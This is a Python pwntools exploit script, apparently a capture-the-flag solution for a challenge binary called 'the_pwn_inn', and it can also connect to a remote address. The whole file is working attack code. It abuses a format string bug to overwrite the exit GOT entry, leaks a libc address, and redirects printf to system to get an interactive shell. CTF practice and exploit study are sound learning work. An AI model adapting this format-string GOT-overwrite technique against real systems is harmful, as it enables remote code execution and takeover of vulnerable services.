#!/usr/bin/env python3
from pwn import *

context(os="linux", arch="amd64", endian="little")
context(terminal=["tmux", "splitw", "-h"])

elf = ELF('./the_pwn_inn')

if args["REMOTE"]:
    p = remote('161.97.176.150', 2626)
elif args["GDB"]:
    p = gdb.debug(elf.path, "b main\nc")
else:
    p = process(elf.path)

def exec_fmt(payload):
    p = process(elf.path)
    p.recvline()
    p.sendline(payload)
    return p.recvall()

# auto = FmtStr(exec_fmt)
# OFFSET = auto.offset
OFFSET = 6

log.success("Exit %#x" % elf.got.exit)

p.recvuntil('Welcome')
writes = {elf.got.exit: elf.sym.vuln}
payload = fmtstr_payload(OFFSET, writes)
p.sendline(payload)

libc = ELF('./libc6_2.31-0ubuntu9.1_amd64.so')

p.sendline("%55$p")
p.recvuntil('Welcome ')
p.recvuntil('Welcome ')
leak_libc = int(p.recv(4096).split(b'0x')[-1].strip(), 16)

libc.address = leak_libc - libc.sym['_IO_2_1_stdout_']
log.info('Libc %#x' % libc.address)

writes = {elf.got.printf: libc.sym.system}
payload = fmtstr_payload(6, writes)
p.sendline(payload)
p.recv(4096)
p.recv(4096)

p.interactive()
